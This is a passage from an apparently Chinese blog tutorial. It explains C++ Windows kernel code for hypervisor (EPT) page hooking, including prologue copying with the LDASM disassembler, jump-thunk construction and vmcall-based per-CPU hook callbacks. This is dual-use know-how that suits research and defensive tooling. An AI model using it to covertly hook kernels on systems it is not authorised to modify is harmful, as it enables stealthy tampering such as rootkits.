NULL&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PPAGE_HOOK_ENTRY <span class="title">PHGetHookEntryByPage</span><span class="params">( IN PVOID ptr, IN PAGE_TYPE Type )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_PageList.Flink == <span class="literal">NULL</span> || <span class="built_in">IsListEmpty</span>( &amp;g_PageList ))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PVOID page = <span class="built_in">PAGE_ALIGN</span>( ptr );<span class="comment">// 确保页面对齐</span></span><br><span class="line">    <span class="comment">// 遍历g_PageList查找匹配的PAGE_HOOK_ENTRY结构体</span></span><br><span class="line">    <span class="keyword">for</span> (PLIST_ENTRY pListEntry = g_PageList.Flink; pListEntry != &amp;g_PageList; pListEntry = pListEntry-&gt;Flink)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 将节点转换为PAGE_HOOK_ENTRY结构体初始位置</span></span><br><span class="line">        PPAGE_HOOK_ENTRY pEntry = <span class="built_in">CONTAINING_RECORD</span>( pListEntry, PAGE_HOOK_ENTRY, Link );</span><br><span class="line">        <span class="comment">// 判断钩子的页面类型、数据是否匹配</span></span><br><span class="line">        <span class="keyword">if</span> ((Type == DATA_PAGE &amp;&amp; pEntry-&gt;DataPageVA == page) || (Type == CODE_PAGE &amp;&amp; pEntry-&gt;CodePageVA == page))</span><br><span class="line">            <span class="keyword">return</span> pEntry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="计算给定成员的结构体初始位置"><a href="#计算给定成员的结构体初始位置" class="headerlink" title="计算给定成员的结构体初始位置"></a>计算给定成员的结构体初始位置</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">接受三个参数：address是指向某个成员的指针，type是结构体类型，field是结构体中的成员名。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">宏定义使用了一些指针运算和转换来计算结构体的起始地址。首先，将address强制转换为PCHAR类型（字符指针），然后通过减去(&amp;((type *)0)-&gt;field)的结果，得到结构体中成员field相对于结构体起始地址的偏移量（以字节计）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">接下来，将该偏移量加到address的地址上，得到结构体的起始地址，并将其强制转换为目标的type类型指针，最终返回该指针作为结果。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这个宏定义可以用于在已知结构体的某个成员地址的情况下，快速地获取整个结构体的起始地址。这种技巧在处理数据结构时非常有用。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONTAINING_RECORD(address, type, field) ((type *)( \</span></span><br><span class="line"><span class="meta">                                                  (PCHAR)(address) - \</span></span><br><span class="line"><span class="meta">                                                  (ULONG_PTR)(&amp;((type *)0)-&gt;field)))</span></span><br></pre></td></tr></table></figure><h4 id="通过LDASM工具将原始字节复制到指定的缓冲区中"><a href="#通过LDASM工具将原始字节复制到指定的缓冲区中" class="headerlink" title="通过LDASM工具将原始字节复制到指定的缓冲区中"></a>通过LDASM工具将原始字节复制到指定的缓冲区中</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Copy original bytes using LDASM</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pFunc&quot;&gt;Original function ptr&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;OriginalStore&quot;&gt;Buffer to store bytes&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pSize&quot;&gt;Lenght of copied data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">PHpCopyCode</span><span class="params">( IN PVOID pFunc, OUT PUCHAR OriginalStore, OUT PULONG pSize )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    LDASM是一个函数解析工具，用于解析x86和x64指令的长度和操作码。它可以读取给定地址上的指令，</span></span><br><span class="line"><span class="comment">    并提供有关指令的详细信息，例如指令长度、操作码、操作数等。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    通过使用LDASM，开发人员可以分析和处理二进制代码，包括动态修改和重写函数的字节码。</span></span><br><span class="line"><span class="comment">    它是基于汇编和机器码规范的解析库，它能够准确地分析各种指令，并提供相关信息以供后续处理。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 追踪已复制的总字节数</span></span><br><span class="line">    PUCHAR src = pFunc;<span class="comment">// 指向原始函数地址</span></span><br><span class="line">    PUCHAR old = OriginalStore;<span class="comment">// 指向目标地址OriginalStore缓冲区</span></span><br><span class="line">    ULONG all_len = <span class="number">0</span>;<span class="comment">// 已复制的总字节数</span></span><br><span class="line">    ldasm_data ld = &#123; <span class="number">0</span> &#125;;<span class="comment">// ldasm_data结构体，用于存储指令信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG len = <span class="built_in">ldasm</span>( src, &amp;ld, TRUE );<span class="comment">// 解析指令，返回指令长度</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine code end</span></span><br><span class="line">        <span class="keyword">if</span> (ld.flags &amp; F_INVALID</span><br><span class="line">            || (len == <span class="number">1</span> &amp;&amp; (src[ld.opcd_offset] == <span class="number">0xCC</span> || src[ld.opcd_offset] == <span class="number">0xC3</span>))</span><br><span class="line">            || (len == <span class="number">3</span> &amp;&amp; src[ld.opcd_offset] == <span class="number">0xC2</span>)</span><br><span class="line">            || len + all_len &gt; <span class="number">128</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 解析失败或者指令长度超过128字节或者指令为单字节返回(0xcc\0xc3)、3字节返回(0xc2),RET、RETN、RETF</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将原始函数代码拷贝到OriginalStore缓冲区</span></span><br><span class="line">        <span class="built_in">memcpy</span>( old, src, len );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果指令中有相对偏移，需要修复</span></span><br><span class="line">        <span class="keyword">if</span> (ld.flags &amp; F_RELATIVE)</span><br><span class="line">        &#123;</span><br><span class="line">            LONG diff = <span class="number">0</span>;</span><br><span class="line">            <span class="type">const</span> <span class="type">uintptr_t</span> ofst = (ld.disp_offset != <span class="number">0</span> ? ld.disp_offset : ld.imm_offset);</span><br><span class="line">            <span class="type">const</span> <span class="type">uintptr_t</span> sz = ld.disp_size != <span class="number">0</span> ? ld.disp_size : ld.imm_size;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>( &amp;diff, src + ofst, sz );</span><br><span class="line">            <span class="comment">// 检查跳转目标地址是否超过了2GB的范围。如果跳转目标地址大于2GB，则跳转会导致整数溢出和错误的行为。</span></span><br><span class="line">            <span class="keyword">if</span> (_abs64( src + len + diff - old ) &gt; INT_MAX)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                diff += (LONG)(src - old);</span><br><span class="line">                <span class="built_in">memcpy</span>( old + ofst, &amp;diff, sz );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        src += len;</span><br><span class="line">        old += len;</span><br><span class="line">        all_len += len;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (all_len &lt; <span class="built_in">sizeof</span>( JUMP_THUNK ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否成功复制了JUMP_THUNK结构体</span></span><br><span class="line">    <span class="keyword">if</span> (all_len &lt; <span class="built_in">sizeof</span>( JUMP_THUNK ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 初始化JUMP_THUNK结构体，用于跳转到Hook函数</span></span><br><span class="line">        <span class="built_in">PHpInitJumpThunk</span>( (PJUMP_THUNK)old, (ULONG64)src );</span><br><span class="line">        *pSize = all_len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="LDASM-返回指令长度"><a href="#LDASM-返回指令长度" class="headerlink" title="LDASM 返回指令长度"></a>LDASM 返回指令长度</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __fastcall <span class="title">ldasm</span><span class="params">( <span class="type">void</span> *code, ldasm_data *ld, ULONG is64 )</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function"> Description:</span></span></span><br><span class="line"><span class="comment"><span class="function"> Disassemble one instruction</span></span></span><br><span class="line"><span class="comment"><span class="function"></span></span></span><br><span class="line"><span class="comment"><span class="function"> Arguments:</span></span></span><br><span class="line"><span class="comment"><span class="function"> code    - pointer to the code for disassemble</span></span></span><br><span class="line"><span class="comment"><span class="function"> ld        - pointer to structure ldasm_data</span></span></span><br><span class="line"><span class="comment"><span class="function"> is64    - set this flag for 64-bit code, and clear for 32-bit</span></span></span><br><span class="line"><span class="comment"><span class="function"></span></span></span><br><span class="line"><span class="comment"><span class="function"> Return:</span></span></span><br><span class="line"><span class="comment"><span class="function"> length of instruction</span></span></span><br><span class="line"><span class="comment"><span class="function"> */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UCHAR *p = (UCHAR*)code;</span><br><span class="line">    UCHAR s, op, f;</span><br><span class="line">    UCHAR rexw, pr_66, pr_67;</span><br><span class="line"></span><br><span class="line">    s = rexw = pr_66 = pr_67 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* dummy check */</span></span><br><span class="line">    <span class="keyword">if</span> (!code || !ld)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init output data */</span></span><br><span class="line">    <span class="built_in">memset</span>( ld, <span class="number">0</span>, <span class="built_in">sizeof</span>( ldasm_data ) );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* phase 1: parse prefixies */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cflags</span>( *p ) &amp; OP_PREFIX) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*p == <span class="number">0x66</span>)</span><br><span class="line">            pr_66 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (*p == <span class="number">0x67</span>)</span><br><span class="line">            pr_67 = <span class="number">1</span>;</span><br><span class="line">        p++; s++;</span><br><span class="line">        ld-&gt;flags |= F_PREFIX;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="number">15</span>) &#123;</span><br><span class="line">            ld-&gt;flags |= F_INVALID;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* parse REX prefix */</span></span><br><span class="line">    <span class="keyword">if</span> (is64 &amp;&amp; *p &gt;&gt; <span class="number">4</span> == <span class="number">4</span>) &#123;</span><br><span class="line">        ld-&gt;rex = *p;</span><br><span class="line">        rexw = (ld-&gt;rex &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>;</span><br><span class="line">        ld-&gt;flags |= F_REX;</span><br><span class="line">        p++; s++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* can be only one REX prefix */</span></span><br><span class="line">    <span class="keyword">if</span> (is64 &amp;&amp; *p &gt;&gt; <span class="number">4</span> == <span class="number">4</span>) &#123;</span><br><span class="line">        ld-&gt;flags |= F_INVALID;</span><br><span class="line">        s++;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* phase 2: parse opcode */</span></span><br><span class="line">    ld-&gt;opcd_offset = (UCHAR)(p - (UCHAR*)code);</span><br><span class="line">    ld-&gt;opcd_size = <span class="number">1</span>;</span><br><span class="line">    op = *p++; s++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* is 2 byte opcode? */</span></span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">0x0F</span>) &#123;</span><br><span class="line">        op = *p++; s++;</span><br><span class="line">        ld-&gt;opcd_size++;</span><br><span class="line">        f = <span class="built_in">cflags_ex</span>( op );</span><br><span class="line">        <span class="keyword">if</span> (f &amp; OP_INVALID) &#123;</span><br><span class="line">            ld-&gt;flags |= F_INVALID;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* for SSE instructions */</span></span><br><span class="line">        <span class="keyword">if</span> (f &amp; OP_EXTENDED) &#123;</span><br><span class="line">            op = *p++; s++;</span><br><span class="line">            ld-&gt;opcd_size++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        f = <span class="built_in">cflags</span>( op );</span><br><span class="line">        <span class="comment">/* pr_66 = pr_67 for opcodes A0-A3 */</span></span><br><span class="line">        <span class="keyword">if</span> (op &gt;= <span class="number">0xA0</span> &amp;&amp; op &lt;= <span class="number">0xA3</span>)</span><br><span class="line">            pr_66 = pr_67;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* phase 3: parse ModR/M, SIB and DISP */</span></span><br><span class="line">    <span class="keyword">if</span> (f &amp; OP_MODRM) &#123;</span><br><span class="line">        UCHAR    mod = (*p &gt;&gt; <span class="number">6</span>);</span><br><span class="line">        UCHAR    ro = (*p &amp; <span class="number">0x38</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">        UCHAR    rm = (*p &amp; <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">        ld-&gt;modrm = *p++; s++;</span><br><span class="line">        ld-&gt;flags |= F_MODRM;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* in F6,F7 opcodes immediate data present if R/O == 0 */</span></span><br><span class="line">        <span class="keyword">if</span> (op == <span class="number">0xF6</span> &amp;&amp; (ro == <span class="number">0</span> || ro == <span class="number">1</span>))</span><br><span class="line">            f |= OP_DATA_I8;</span><br><span class="line">        <span class="keyword">if</span> (op == <span class="number">0xF7</span> &amp;&amp; (ro == <span class="number">0</span> || ro == <span class="number">1</span>))</span><br><span class="line">            f |= OP_DATA_I16_I32_I64;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* is SIB byte exist? */</span></span><br><span class="line">        <span class="keyword">if</span> (mod != <span class="number">3</span> &amp;&amp; rm == <span class="number">4</span> &amp;&amp; !(!is64 &amp;&amp; pr_67)) &#123;</span><br><span class="line">            ld-&gt;sib = *p++; s++;</span><br><span class="line">            ld-&gt;flags |= F_SIB;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* if base == 5 and mod == 0 */</span></span><br><span class="line">            <span class="keyword">if</span> ((ld-&gt;sib &amp; <span class="number">7</span>) == <span class="number">5</span> &amp;&amp; mod == <span class="number">0</span>) &#123;</span><br><span class="line">                ld-&gt;disp_size = <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (mod) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> (is64) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rm == <span class="number">5</span>) &#123;</span><br><span class="line">                    ld-&gt;disp_size = <span class="number">4</span>;</span><br><span class="line">                    <span class="keyword">if</span> (is64)</span><br><span class="line">                        ld-&gt;flags |= F_RELATIVE;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (pr_67) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rm == <span class="number">6</span>)</span><br><span class="line">                    ld-&gt;disp_size = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (rm == <span class="number">5</span>)</span><br><span class="line">                    ld-&gt;disp_size = <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            ld-&gt;disp_size = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span> (is64)</span><br><span class="line">                ld-&gt;disp_size = <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (pr_67)</span><br><span class="line">                ld-&gt;disp_size = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ld-&gt;disp_size = <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ld-&gt;disp_size) &#123;</span><br><span class="line">            ld-&gt;disp_offset = (UCHAR)(p - (UCHAR *)code);</span><br><span class="line">            p += ld-&gt;disp_size;</span><br><span class="line">            s += ld-&gt;disp_size;</span><br><span class="line">            ld-&gt;flags |= F_DISP;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* phase 4: parse immediate data */</span></span><br><span class="line">    <span class="keyword">if</span> (rexw &amp;&amp; f &amp; OP_DATA_I16_I32_I64)</span><br><span class="line">        ld-&gt;imm_size = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (f &amp; OP_DATA_I16_I32 || f &amp; OP_DATA_I16_I32_I64)</span><br><span class="line">        ld-&gt;imm_size = <span class="number">4</span> - (pr_66 &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* if exist, add OP_DATA_I16 and OP_DATA_I8 size */</span></span><br><span class="line">    ld-&gt;imm_size += f &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ld-&gt;imm_size) &#123;</span><br><span class="line">        s += ld-&gt;imm_size;</span><br><span class="line">        ld-&gt;imm_offset = (UCHAR)(p - (UCHAR *)code);</span><br><span class="line">        ld-&gt;flags |= F_IMM;</span><br><span class="line">        <span class="keyword">if</span> (f &amp; OP_RELATIVE)</span><br><span class="line">            ld-&gt;flags |= F_RELATIVE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* instruction is too long */</span></span><br><span class="line">    <span class="keyword">if</span> (s &gt; <span class="number">15</span>)</span><br><span class="line">        ld-&gt;flags |= F_INVALID;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="构造跳转指令字节码"><a href="#构造跳转指令字节码" class="headerlink" title="构造跳转指令字节码"></a>构造跳转指令字节码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Construct jump </span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pThunk&quot;&gt;Data to initialize&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;To&quot;&gt;Address of jump&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">PHpInitJumpThunk</span><span class="params">( IN OUT PJUMP_THUNK pThunk, IN ULONG64 To )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PULARGE_INTEGER liTo = (PULARGE_INTEGER)&amp;To;<span class="comment">// 无符号64位整数</span></span><br><span class="line"></span><br><span class="line">    pThunk-&gt;PushOp = <span class="number">0x68</span>;<span class="comment">// 推入32位立即数</span></span><br><span class="line">    pThunk-&gt;AddressLow = liTo-&gt;LowPart;<span class="comment">// 低32位地址</span></span><br><span class="line">    pThunk-&gt;MovOp = <span class="number">0x042444C7</span>;<span class="comment">// 将32位常数移动到指定内存</span></span><br><span class="line">    pThunk-&gt;AddressHigh = liTo-&gt;HighPart;<span class="comment">// 高32位地址</span></span><br><span class="line">    pThunk-&gt;RetOp = <span class="number">0xC3</span>;<span class="comment">// 返回指令</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="每个CPU页面钩子和解钩的回调函数"><a href="#每个CPU页面钩子和解钩的回调函数" class="headerlink" title="每个CPU页面钩子和解钩的回调函数"></a>每个CPU页面钩子和解钩的回调函数</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Per-CPU page hook/unhook routine</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Dpc&quot;&gt;Unused&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Context&quot;&gt;Valid PHOOK_CONTEXT&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;SystemArgument1&quot;&gt;Unused&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;SystemArgument2&quot;&gt;Unused&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">PHpHookCallbackDPC</span><span class="params">( IN PRKDPC Dpc, IN PVOID Context, IN PVOID SystemArgument1, IN PVOID SystemArgument2 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( Dpc );</span><br><span class="line">    PHOOK_CONTEXT pCTX = (PHOOK_CONTEXT)Context;<span class="comment">// hook上下文</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pCTX != <span class="literal">NULL</span>)<span class="comment">// 进行hook或unhook</span></span><br><span class="line">        __vmx_vmcall( pCTX-&gt;Hook ? HYPERCALL_HOOK_PAGE : HYPERCALL_UNHOOK_PAGE, pCTX-&gt;DataPagePFN, pCTX-&gt;CodePagePFN, <span class="number">0</span> );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">KeSignalCallDpcSynchronize</span>( 